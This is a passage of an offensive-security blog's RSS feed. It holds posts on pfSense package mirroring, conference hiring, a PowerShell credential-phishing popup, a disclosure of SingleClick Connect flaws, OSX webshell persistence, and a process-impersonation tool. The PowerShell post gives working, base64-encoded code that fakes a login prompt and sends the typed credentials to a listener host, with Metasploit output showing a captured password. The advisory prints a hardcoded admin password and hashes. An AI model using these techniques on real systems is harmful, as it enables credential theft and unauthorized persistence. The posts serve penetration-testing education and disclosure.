&lt;p&gt;Then make sure you have the IP or hostname of your package repository web server in the &lt;code&gt;/pkg_mgr_settings.php&lt;/code&gt; (on 2.0, follow the guidelines on the doc above for older versions). After that you should be good to go. Of course this is barring any Firewall blockages you might have in place so be sure to test connectivity from the pfSense box to the web server.&lt;/p&gt;

&lt;p&gt;So, that was just the beginning, it&amp;rsquo;s actually better to not null-route it but make the following entries:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;files.pfsense.org - 192.168.1.100
files.pfsense.com - 192.168.1.100
www.pfsense.org - 192.168.1.100
www.pfsense.com - 192.168.1.100
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If your package web server is 192.168.1.100.
Next is the problem of not having the packages themselves. So &lt;code&gt;wget -mk -np http://files.pfsense.org/packages/&lt;/code&gt; gave me a directory that I plopped into my already existant packages directory (created from the git clone as described in the documentation) but the problem I ran into was the php files being rendered still (which made any packages that pulled php files get the rendered version instead of source).&lt;/p&gt;

&lt;p&gt;So you need to add a &lt;code&gt;.htaccess&lt;/code&gt; file in the packages directory with the following:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;RemoveHandler .php .phtml .php3
RemoveType .php .phtml .php3
php_flag engine off
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Make sure that &lt;code&gt;AllowOverride all&lt;/code&gt; is enabled if you are running Apache to host the package site, if not, you&amp;rsquo;ll have to google how to allow &lt;code&gt;.htaccess&lt;/code&gt; files for your particular server. (or if you server doesn&amp;rsquo;t support htaccess files then how to enable source disclosure)&lt;/p&gt;

&lt;p&gt;After those alterations I seem to be off to the races for the most part. Some packages pull from other websites, but altering the &lt;code&gt;package_8.xml&lt;/code&gt; or just rerouting the dns seems to solve most of those issues.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>2015 ShmooCon Hiring</title>
      <link>http://room362.com/post/2015/2015-shmoocon-hiring/</link>
      <pubDate>Tue, 13 Jan 2015 10:55:08 -0500</pubDate>
      
      <guid>http://room362.com/post/2015/2015-shmoocon-hiring/</guid>
      <description>&lt;p&gt;It&amp;rsquo;s often tough from both hiring and job hunters to find one another at conferences. I think this is mostly because of a couple things.&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;No one wants to stand at a both on either side and talk job stuff in front of a bunch of people and people at booths rarely get the chance to get away.&lt;/li&gt;
&lt;li&gt;It&amp;rsquo;s hard to know &amp;ldquo;who&amp;rdquo; to talk to.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So I created a very simple Google doc to help put twitter handles and links together for people who are job hunting and people who are hiring to kinda get to know who to talk to.&lt;/p&gt;

&lt;p&gt;Got more to add? Please let me know and I&amp;rsquo;ll get it added, or simply make a comment on the Google doc with the info to add&lt;/p&gt;

&lt;iframe width=100% height=1200 src=&#34;https://docs.google.com/spreadsheets/d/1TytbnvqekJEF0jxLANe6sNa5fu05dFaHEP7zudlJej0/pubhtml?widget=true&amp;amp;headers=false&#34;&gt;&lt;/iframe&gt;

&lt;p&gt;Link to the doc is here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://docs.google.com/spreadsheets/d/1TytbnvqekJEF0jxLANe6sNa5fu05dFaHEP7zudlJej0/edit?usp=sharing&#34;&gt;https://docs.google.com/spreadsheets/d/1TytbnvqekJEF0jxLANe6sNa5fu05dFaHEP7zudlJej0/edit?usp=sharing&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hope this helps,&lt;/p&gt;

&lt;p&gt;Rob&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Powershell Popups &#43; Capture</title>
      <link>http://room362.com/post/2015/powershell-popups-and-capture/</link>
      <pubDate>Mon, 12 Jan 2015 17:52:10 -0500</pubDate>
      
      <guid>http://room362.com/post/2015/powershell-popups-and-capture/</guid>
      <description>&lt;p&gt;Metasploit Minute has entered into it&amp;rsquo;s 3rd &amp;ldquo;season&amp;rdquo;. And we kick it off with using the Metasploit capture modules to capture creds from this powershell popup. The cool thing about this is you can leave it to execute on a system without any other code on disk and get creds constantly as any level of user. No admin, no UAC bypass needed. Just a bunch of creds for free.. over SSL. ;-)&lt;/p&gt;

&lt;p&gt;Here is the video:&lt;/p&gt;

&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/H_E3FNF8rBw&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;

&lt;p&gt;Here is the code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$cred = $host.ui.promptforcredential(&#39;Failed Authentication&#39;,&#39;&#39;,[Environment]::UserDomainName + &amp;quot;\&amp;quot; + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$wc = new-object net.webclient;
$wc.Headers.Add(&amp;quot;User-Agent&amp;quot;,&amp;quot;Wget/1.9+cvs-stable (Red Hat modified)&amp;quot;);
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, &#39;&#39;);
$result = $wc.downloadstring(&#39;https://172.16.102.163&#39;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lets break down the code line by line:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$cred = $host.ui.promptforcredential(&#39;Failed Authentication&#39;,&#39;&#39;,[Environment]::UserName,[Environment]::UserDomainName);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This tells windows to prompt for credentials, with the title of &amp;ldquo;Failed Authentication&amp;rdquo;, no info in the comment (so it uses default), and include the username and domain in the box to add authenticity. Thats where all the magic is, everything else is just gravy.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tells powershell not to verify SSL certificates (allows us to use self signed certs in the HTTPS transaction later&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$wc = new-object net.webclient;
$wc.Headers.Add(&amp;quot;User-Agent&amp;quot;,&amp;quot;Wget/1.9+cvs-stable (Red Hat modified)&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Creates a new webclient object and sets its user agent to &amp;lsquo;wget&amp;rsquo;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tells powershell to use whatever proxy the current user uses with whatever credentials they have cached. If one or both are unnecessary it just ignores these settings.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$wc.credentials = new-object system.net.networkcredential($cred.username, $cred.getnetworkcredential().password, &#39;&#39;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tells powershell that the HTTP-Basic credentials to use are the ones typed in the popup box recently by the user.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$result = $wc.downloadstring(&#39;https://172.16.102.163&#39;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And finally the request to HTTP-Basic capture module in metasploit, but you could have anything you want capture these creds.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cat power.txt | iconv --to-code UTF-16LE | base64

JABjAHIAZQBkACAAPQAgACQAaABvAHMAdAAuAHUAaQAuAHAAcgBvAG0AcAB0AGYAbwByAGMAcgBlAGQAZQBuAHQAaQBhAGwAKAAnAEYAYQBpAGwAZQBkACAAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACcALAAnACcALABbAEUAbgB2AGkAcgBvAG4AbQBlAG4AdABdADoAOgBVAHMAZQByAEQAbwBtAGEAaQBuAE4AYQBtAGUAIAArACAAIgBcACIAIAArACAAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBOAGEAbQBlACwAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVQBzAGUAcgBEAG8AbQBhAGkAbgBOAGEAbQBlACkAOwAKAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAKACQAdwBjACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsACgAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAVQBzAGUAcgAtAEEAZwBlAG4AdAAiACwAIgBXAGcAZQB0AC8AMQAuADkAKwBjAHYAcwAtAHMAdABhAGIAbABlACAAKABSAGUAZAAgAEgAYQB0ACAAbQBvAGQAaQBmAGkAZQBkACkAIgApADsACgAkAHcAYwAuAFAAcgBvAHgAeQAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsACgAkAHcAYwAuAFAAcgBvAHgAeQAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBDAHIAZQBkAGUAbgB0AGkAYQBsAEMAYQBjAGgAZQBdADoAOgBEAGUAZgBhAHUAbAB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbABzADsACgAkAHcAYwAuAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAD0AIABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAG4AZQB0AHcAbwByAGsAYwByAGUAZABlAG4AdABpAGEAbAAoACQAYwByAGUAZAAuAHUAcwBlAHIAbgBhAG0AZQAsACAAJABjAHIAZQBkAC4AZwBlAHQAbgBlAHQAdwBvAHIAawBjAHIAZQBkAGUAbgB0AGkAYQBsACgAKQAuAHAAYQBzAHMAdwBvAHIAZAAsACAAJwAnACkAOwAKACQAcgBlAHMAdQBsAHQAIAA9ACAAJAB3AGMALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADcAMgAuADEANgAuADEAMAAyAC4AMQA2ADMAJwApADsACgA=
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then execute &lt;code&gt;powershell -ep bypass -enc &amp;lt;the encoded text from above&amp;gt;&lt;/code&gt; and you get this:&lt;/p&gt;

&lt;p&gt;Image should be here: &lt;img src=&#34;http://room362.com/images/2015/powershellpopup.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@wpad:~/metasploit-framework# ./msfconsole -Lq
msf &amp;gt; use auxiliary/server/capture/http_basic
msf auxiliary(http_basic) &amp;gt; show options

Module options (auxiliary/server/capture/http_basic):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   REALM        Secure Site      yes       The authentication realm you&#39;d like to present.
   RedirectURL                   no        The page to redirect users to after they enter basic auth creds
   SRVHOST      0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT      80               yes       The local port to listen on.
   SSL          false            no        Negotiate SSL for incoming connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   SSLVersion   SSL3             no        Specify the version of SSL that should be used (accepted: SSL2, SSL3, TLS1)
   URIPATH                       no        The URI to use for this exploit (default is random)

msf auxiliary(http_basic) &amp;gt; set SSL true
SSL =&amp;gt; true
msf auxiliary(http_basic) &amp;gt; set SRVPORT 443
SRVPORT =&amp;gt; 443
msf auxiliary(http_basic) &amp;gt; set URIPATH /
URIPATH =&amp;gt; /
msf auxiliary(http_basic) &amp;gt; run
[*] Auxiliary module execution completed
msf auxiliary(http_basic) &amp;gt;
[*] Listening on 0.0.0.0:443...
[*] Using URL: https://0.0.0.0:443/
[*]  Local IP: https://172.16.102.163:443/
[*] Server started.
[*] 172.16.102.140   http_basic - Sending 401 to client 172.16.102.140
[+] 172.16.102.140 - Credential collected: &amp;quot;SITTINGDUCK\user:ASDqwe123&amp;quot; =&amp;gt; /
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Game over!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Full Disclosure - SingleClick Connect</title>
      <link>http://room362.com/post/2014/full-disclosure-singleclick-connect/</link>
      <pubDate>Mon, 15 Sep 2014 11:26:38 -0500</pubDate>
      
      <guid>http://room362.com/post/2014/full-disclosure-singleclick-connect/</guid>
      <description>

&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: I originally posted this to the Full Disclosure mailing list but for some reason it wasn&amp;rsquo;t accepted via the moderator so I&amp;rsquo;m posting it here. First, so that the information does get out there, and second to see if anyone knows why it may have been rejected.&lt;/p&gt;

&lt;p&gt;I was helping out a family member with their computer when it came up that they &amp;ldquo;already had remote help software&amp;rdquo; (SingleClickConnect or SCC), when I asked what this was, the family member said it was installed by Dell Support when trying to fix their issue. This was in 2008. I removed it, and helped to fix the issue.&lt;/p&gt;

&lt;p&gt;In 2010 another issue arose on the new computer (Dell again) of the same family member. Again, calling support first they had installed this software.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt;: I can not say for certain that it was Dell&amp;rsquo;s support rep, or even that it was them that installed it, but if Dell is using this as a means of support they should probably cease for the following reasons:&lt;/p&gt;

&lt;p&gt;Apache (port 40080) listening 0.0.0.0, MySQL (port 17771) listening 127.0.0.1, PHP, and UltraVNC (5900) are installed as a part of the software package.&lt;/p&gt;

&lt;h2 id=&#34;issue-1:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;ISSUE #1&lt;/h2&gt;

&lt;p&gt;Without decoding the ionCube &amp;ldquo;copyright protecting&amp;rdquo; software a large number of XSS, CSRF, and SQLi vulnerabilities were found, all unauthenticated to the web app that runs there.&lt;/p&gt;

&lt;p&gt;No specifics are being posted on these vulnerabilities as I assume the site on the net (company&amp;rsquo;s site), where a registered user would log in are the same as the ones locally hosted (at least the app looks the same and has similar page structure)&lt;/p&gt;

&lt;h2 id=&#34;issue-2:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;ISSUE #2&lt;/h2&gt;

&lt;p&gt;MySQL&amp;rsquo;s root password is blank and there are two other default accounts as well allowing easy privilege escalation to SYSTEM (via the SCC local account - see ISSUE #5):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;dsl *7E1CA3417E3A159A9188657F44C7034A8E9FDFF2
tera *B2744A6BC5E8B1667BE5AED0111A2B941356E4A4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;^ uncracked at this point. For all I know they could be randomized at install&lt;/p&gt;

&lt;h2 id=&#34;issue-3:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;ISSUE #3&lt;/h2&gt;

&lt;p&gt;Another service listens on 0.0.0.0 via port 17667 that I haven&amp;rsquo;t been able to identify, however when you connect to the socket, it starts listing users, services, printers and interfaces (and that is without sending any data to it).&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ ncat 172.16.102.149 17667
8�TXPBASELINEXP_BASEP�RAdministratorGuestHelpAssistantSingleClick
AdminSUPPORT_388945a0!aCACAMD PCNET Family PCI Ethernet Adapter -
Packet Scheduler Miniport{47F69AAC-AE9A-40A9-88F5-A246A169CE92}�f�
)�n�����f�f��fDownloadsC:\Documents and Settings\Administrator\My
Documents\DownloadsMicrosoft XPS Document
WriterXPSPortprinter#:2TPVM#:1TPVMACDWindows FirewallMicrosoftCreative
Sound Blaster PCI
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;issue-4:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;ISSUE #4&lt;/h2&gt;

&lt;p&gt;When UltraVNC is installed, it uses the same password as the one for your &amp;lsquo;registered&amp;rsquo; account (just password auth) and listens on 0.0.0.0. It is easily to decrypt from the UltraVNC.ini that is located in &lt;code&gt;%ApplicationData%&lt;/code&gt; for the user&lt;/p&gt;

&lt;h2 id=&#34;issue-5:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;ISSUE #5&lt;/h2&gt;

&lt;p&gt;A local account called &amp;ldquo;SingleClick Admin&amp;rdquo; is installed with a static
password and added to the Administrators group. 3 services are also
installed with the SingleClick Admin account as the user it runs
under:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Package d&#39;authentification  : NTLM
Utilisateur principal       : SingleClick Admin
     msv1_0 :     lm{ 7a9793d3082ba83b790ce07b3bdf85ea }, ntlm{ 2c292724d67fcf310d1c4dd153467be8 }
     kerberos :     ~!3no1972!~
     ssp :
     wdigest :     ~!3no1972!~


 8. Name         : _SC_Apache2.2
 8. Service      : .\SingleClick Admin
 8. Current      : ~!3no1972!~

 9. Name         : _SC_dsl-fs-sync
 9. Service      : .\SingleClick Admin
 9. Current      : ~!3no1972!~
 9. Old          : ~!3no1972!~

10. Name         : _SC_hnmsvc
10. Service      : .\SingleClick Admin
10. Current      : ~!3no1972!~
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;concern-1:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;CONCERN #1&lt;/h2&gt;

&lt;p&gt;As far as I can tell the software continuously scans you local network for other computers and file system for changes and reports these back to the central server so that when you login to their service you can see your files and connect to other systems in the LAN of the machine SingleClickConnect is installed on.&lt;/p&gt;

&lt;h2 id=&#34;concern-2:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;CONCERN #2&lt;/h2&gt;

&lt;p&gt;The user account password that you use to register and connect remotely is stored in the database. This actually looks decently done, or I just haven&amp;rsquo;t been able to identify the storage&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Database: p2p
Table:    config_info
Value:    “user_hash”
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;concern-3:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;CONCERN #3&lt;/h2&gt;

&lt;p&gt;Not sure what this registry key contains other than being named Cred4RA and assuming it&amp;rsquo;s credentials for the remote administration. Hopefully encrypted some how.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[HKEY_LOCAL_MACHINE\SOFTWARE\SingleClick Systems\Advanced Networking
Service\Settings\Remote Access]
&amp;quot;ConfigState&amp;quot;=dword:00000001
&amp;quot;Cred4RA&amp;quot;=hex:01,00,00 (snip snip)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;additional-information:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;Additional Information&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Software original site: &lt;a href=&#34;http://www.singleclickconnect.com/&#34;&gt;http://www.singleclickconnect.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Current site: &lt;a href=&#34;http://www.vivedriveconnect.com/&#34;&gt;http://www.vivedriveconnect.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Direct download of software (for home use): &lt;a href=&#34;http://downloads.vivedriveconnect.com/scc_setup.exe&#34;&gt;http://downloads.vivedriveconnect.com/scc_setup.exe&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;vendor-contact:f124dd1cc9d0578aa8e40fb5e3e0e659&#34;&gt;Vendor Contact&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Email sent in &lt;strong&gt;2010 July&lt;/strong&gt; about issues 1 - 5

&lt;ul&gt;
&lt;li&gt;No reply, and forgot about until 2013 when the software was
mentioned by a friend (if I had ever heard of it)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2013 April&lt;/strong&gt; - Email sent again, forwarding original, bounced back as
account unknown&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2014 August&lt;/strong&gt; - Accidentally found notes while searching for
something else, attempted to relocate the software via Archive.org
with the feeling that the site had gone away and happened upon the new
site,, downloaded software, confirmed issues, and forwarded the email
to the new point of contact at the new domain. No response.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2014 September&lt;/strong&gt;, Full disclosure.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Dell&amp;hellip; If your techs do actually use this software for support (I
hope not) in any form or fashion, you are putting each one of them at
a pretty high risk.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>OSX Persistence via PHP Webshell</title>
      <link>http://room362.com/post/2014/2014-09-09-osx-persistence-via-php-webshell/</link>
      <pubDate>Tue, 09 Sep 2014 15:25:27 -0400</pubDate>
      
      <guid>http://room362.com/post/2014/2014-09-09-osx-persistence-via-php-webshell/</guid>
      <description>&lt;p&gt;As I learn more and more about OSX I find things that surprise me. For instance, in this post I will be showing you how to, &lt;strong&gt;with root or sudo priviledge&lt;/strong&gt;, enable the &lt;strong&gt;built-in&lt;/strong&gt; apache server on OSX and it&amp;rsquo;s &lt;strong&gt;PHP&lt;/strong&gt; module&amp;hellip;.&lt;/p&gt;

&lt;p&gt;I am working with OSX Mavericks so your locations may vary based on the version of OSX your target it.&lt;/p&gt;

&lt;p&gt;First things first is to enable the PHP module for the Apache server.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo nano -w /etc/apache2/httpd.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;(vi or emacs to your heart&amp;rsquo;s content)&lt;/em&gt;. But what we are looking for is to uncomment the following line:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#LoadModule php5_module libexec/apache2/libphp5.so
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Once you do that, start up Apache. This can be done temporarily (won&amp;rsquo;t survive a reboot) with the &lt;code&gt;apachectl&lt;/code&gt; command:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo apachectl start
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Or you can make it more permanent with &lt;code&gt;launchctl&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And undoing the damage with:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo launchctl unload -w /System/Library/LaunchDaemons/org.apache.httpd.plist
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/osx_apache.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;After that, just drop your favorite PHP shell into the &lt;code&gt;/Library/WebServer/Documents/&lt;/code&gt; directory and you&amp;rsquo;re done. (My favorites are &lt;a href=&#34;https://github.com/b374k/b374k&#34;&gt;b374k&lt;/a&gt; and PHP Meterpreter.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/osx_php_shell.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Milkman: Creating processes as any currently logged in user</title>
      <link>http://room362.com/post/2014/2014-08-14-milkman-creating-processes-as-any-currently-logged-in-user/</link>
      <pubDate>Thu, 14 Aug 2014 00:09:21 -0400</pubDate>
      
      <guid>http://room362.com/post/2014/2014-08-14-milkman-creating-processes-as-any-currently-logged-in-user/</guid>
      <description>&lt;p&gt;One of the problems with using PSEXEC from Metasploit (any of the psexec modules) is that it runs as &lt;strong&gt;SYSTEM&lt;/strong&gt;. What&amp;rsquo;s the problem with that? Isn&amp;rsquo;t &lt;strong&gt;SYSTEM&lt;/strong&gt; god mode? Ya, and normally I&amp;rsquo;d agree that it&amp;rsquo;s the best level to have, but the defenses these days have gotten better, and getting direct connections out is pretty rare. That leaves proxies, and as you know &lt;strong&gt;SYSTEM&lt;/strong&gt; doesn&amp;rsquo;t get any proxy settings.&lt;/p&gt;

&lt;p&gt;Here is a blog post that I made &lt;a href=&#34;http://room362.com/blog/2012/10/21/setting-systems-proxy-settings-with-metasploit/&#34;&gt;about setting the proxies for SYSTEM&lt;/a&gt; but leaving settings like this set is not only sloppy but hard to clean up.&lt;/p&gt;

&lt;p&gt;Along comes &lt;code&gt;RunAsCurrentUser-2.0.3.1.exe&lt;/code&gt; I found this gem by messing up a search on google for RunAsUser. Found it &lt;a href=&#34;https://www-304.ibm.com/support/docview.wss?uid=swg21506033&#34;&gt;on this IBM support post&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://room362.com/images/postimages/201408_ibm_runascurrentuser.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Link to direct download: &lt;a href=&#34;http://software.bigfix.com/download/bes/util/RunAsCurrentUser-2.0.3.1.exe&#34;&gt;http://software.bigfix.com/download/bes/util/RunAsCurrentUser-2.0.3.1.exe&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here is a mirror uploaded to my Post Exploitation repo: &lt;a href=&#34;https://github.com/mubix/post-exploitation/blob/master/win32bins/RunAsCurrentUser-2.0.3.1.exe&#34;&gt;https://github.com/mubix/post-exploitation/blob/master/win32bins/RunAsCurrentUser-2.0.3.1.exe&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This binary takes a path to another executable as an argument. It then finds the currently logged in user and starts the provided executable as that user. AWESOME! This basically solves the whole  PSEXEC-&amp;gt;SYSTEM no-proxy settings issue. And it&amp;rsquo;s created by a legitimate company for legitimate reasons? w00tw00t. Game on!&lt;/p&gt;

&lt;p&gt;Only two problems:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;It is 335K, which doesn&amp;rsquo;t seem like much but over high latency lines that can take an eternity to transfer, especially over doubly encrypted channels like with a reverse_https meterpreter session.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;It takes an argument which normally isn&amp;rsquo;t a huge challenge, but in our specific use case, psexec modules in Metasploit, it isn&amp;rsquo;t something we can do easily. You would have to upload your C2 binary, as well as the 335K RunAsCurrentUser over to the target host, then run the psexec_command module to execute them both, one as the argument of the other. Kinda sloppy.&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So I set to try and figure out how this binary did it&amp;rsquo;s magic. As I&amp;rsquo;m not much of a reverse engineer I &lt;a href=&#34;https://www.virustotal.com/en/file/1a9b518c775e2a85a7c47801e9b8221df338a65ad8df326485e4cd2aea22fe52/analysis/&#34;&gt;uploaded it to VirusTotal&lt;/a&gt; so I could take a look at it&amp;rsquo;s insides (plus, double check to see if it was being detected as malicious at all).&lt;/p&gt;

&lt;p&gt;As far as I can tell the important pieces are the Windows API calls &lt;strong&gt;ImpersonateLoggedOnUser&lt;/strong&gt;, and &lt;strong&gt;CreateProcessAsUserA&lt;/strong&gt;. I set to trying to reproduce what it did in &lt;a href=&#34;https://www.autoitscript.com/site/autoit/&#34;&gt;AutoIT (awesome stuff if you have never checked it out)&lt;/a&gt;. I couldn&amp;rsquo;t quite get the API calls right, so I decided to give C++ a shot. Turned out to be pretty simple. I present to you &amp;ldquo;Milkman&amp;rdquo;:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://gist.github.com/mubix/5d0cacdabfe092922fa3&#34;&gt;https://gist.github.com/mubix/5d0cacdabfe092922fa3&lt;/a&gt;  &lt;strong&gt;(full source included below)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This program (once compiled) takes one argument (or none at all) and runs calc.exe for every instance of the process you tell it to. If you run it without arguments it auto selects explorer.exe. So if you create a service:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\temp\&amp;gt;sc create SuperService binpath= C:\Temp\milkman.exe type= own start= auto
[SC] CreateService SUCCESS
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It will start up every time the computer starts, which is completely useless, since there won&amp;rsquo;t be any users logged in at that point, but you get where this can go. Features to add to this at point are:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Create a service binary that responds to START/STOP/PAUSE commands and such so that running this as a persistence method would actually be useful.&lt;/li&gt;
&lt;li&gt;Add a loop so that it continues to run checking for explorer.exe every so often so it can catch when someone is logged in.&lt;/li&gt;
&lt;li&gt;Finally the obvious one is to change it from being calc.exe that it runs by accepting another argument or some other kind of config option.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Thoughts? What would you like Milkman to do, or what use case do you think a tweak would make it work better for? Leave a comment below.&lt;/p&gt;

&lt;script src=&#34;https://gist.github.com/mubix/5d0cacdabfe092922fa3.js&#34;&gt;&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>The Internets Own Boy</title>
      <link>http://room362.com/post/2014/2014-07-10-the-internets-own-boy/</link>
      <pubDate>Thu, 10 Jul 2014 02:45:13 -0400</pubDate>
      
      <guid>http://room362.com/post/2014/2014-07-10-the-internets-own-boy/</guid>
      <description>&lt;p&gt;Anyone who knows me knows that I live in a tiny world of offensive security, so much so that I miss large world events entirely. (Like elections and hurricanes)&lt;/p&gt;

&lt;p&gt;I didn&amp;rsquo;t know Aaron Swartz, or even 1% of what he was doing in the world to make it a better place and for that I am ashamed. I will do better, to look around, see what needs to be changed in this world and make it a reality.&lt;/p&gt;

